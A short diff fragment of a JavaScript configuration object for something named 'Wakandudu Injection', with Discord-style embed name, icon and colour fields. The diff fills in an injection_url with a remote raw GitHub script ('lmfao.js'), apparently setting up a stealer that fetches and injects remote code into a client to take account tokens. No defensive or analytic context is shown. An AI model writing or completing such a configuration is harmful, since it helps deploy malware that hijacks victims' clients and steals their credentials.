@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Wakandudu Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Wakandudu/platform/main/150868498.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/dsfdsfds12321/sdfsdfsdf/main/lmfao.js', 
   /**
    
    **/
